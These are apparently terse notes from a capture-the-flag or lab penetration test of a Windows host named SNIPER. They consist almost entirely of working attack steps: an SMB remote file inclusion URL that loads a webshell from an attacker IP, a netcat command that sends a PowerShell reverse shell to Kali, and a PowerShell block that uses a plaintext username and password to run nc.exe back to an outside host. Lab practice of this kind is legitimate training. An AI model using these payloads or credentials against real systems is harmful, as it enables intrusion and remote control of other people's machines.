##

http://10.129.107.51/blog/?lang=//10.10.14.4//evil//webshell.php

##

#
WEB RFI doesn't work, but SMB RFI works. Reverse Shell with Pentesting Monkey doesn't work, but Metepreter and WebShell work. 

Created Dir and upload NC to execute powershell to kali. nc.exe -e powershell ip port
#

```
$username = 'SNIPER\Chris'
 $password = '36mEAhz/B8xQ~2VM'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 Invoke-command -computername SNIPER -credential $credential -scriptblock { cmd.exe /c "C:\tmp\nc.exe" -e powershell 10.10.14.39 1234 }
```
